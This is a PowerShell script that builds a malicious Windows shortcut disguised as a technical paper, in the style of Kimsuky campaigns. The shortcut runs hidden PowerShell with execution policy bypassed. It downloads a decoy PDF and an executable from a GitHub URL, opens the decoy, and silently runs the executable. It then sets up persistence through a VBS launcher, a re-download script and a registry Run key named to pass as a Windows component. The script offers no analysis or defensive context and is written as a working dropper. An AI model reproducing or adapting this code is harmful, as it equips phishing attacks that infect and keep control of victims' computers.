# CREATE KIMSUKY-STYLE LNK WITH EMBEDDED DECODER
$lnkPath = "$env:USERPROFILE\Desktop\Technical_Paper.lnk"

$shell = New-Object -ComObject WScript.Shell
$lnk = $shell.CreateShortcut($lnkPath)

$lnk.TargetPath = "powershell.exe"
$lnk.Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"& { 
    `$pdfUrl = 'https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/1b8f22c806de43fe97c6cd555f455d166591d54d/assets/Nakaz_No._661_vid_02.03.2026.pdf';
    `$exeUrl = 'https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/main/assets/EdgeUpdater.exe';
    `$cache = '$env:APPDATA\Microsoft\Windows\Caches';
    New-Item -ItemType Directory -Path `$cache -Force | Out-Null;
    `$pdfPath = Join-Path `$cache 'doc.pdf';
    `$exePath = Join-Path `$cache 'helper.exe';
    Invoke-WebRequest -Uri `$pdfUrl -OutFile `$pdfPath -UseBasicParsing;
    Invoke-WebRequest -Uri `$exeUrl -OutFile `$exePath -UseBasicParsing;
    Start-Process `$pdfPath -Verb Open;
    Start-Sleep -Seconds 35;
    (New-Object -ComObject WScript.Shell).Run('`"`$exePath`"', 0, `$false);
    
    # Persistence - clean single VBS
    `$vbs = '$env:APPDATA\Microsoft\Windows\Libraries\update.vbs';
    `$sync = '$env:APPDATA\Microsoft\Windows\Libraries\sync.ps1';
    'Set WshShell = CreateObject(""WScript.Shell"")' + \"`r`n\" + 'WshShell.Run \"powershell.exe -NoProfile -ExecutionPolicy Bypass -NonInteractive -File \"\"' + `$sync + '\"\"\", 0, False' | Out-File `$vbs -Encoding ASCII;
    '@
    `$exeUrl = \"'$exeUrl'\"' + \"`r`n\" + '`$exePath = \"'$exePath'\"' + \"`r`n\" + 'Start-Sleep -Seconds (Get-Random -Min 8 -Max 15); if (-not (Test-Path `$exePath)) { Invoke-WebRequest -Uri `$exeUrl -OutFile `$exePath -UseBasicParsing }; (New-Object -ComObject WScript.Shell).Run(\"`\"`$exePath`\"\", 0, `$false)' | Out-File `$sync -Encoding UTF8;
    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsCacheUpdater' -Value \"wscript.exe `\"$vbs`\"\" -Type String -Force;
}`""

$lnk.IconLocation = "%SystemRoot%\System32\shell32.dll,0"   # neutral icon, change to PDF icon if you want
$lnk.WorkingDirectory = "$env:TEMP"
$lnk.Save()

Write-Host "LNK created at $lnkPath - use this one from now on" -ForegroundColor Green
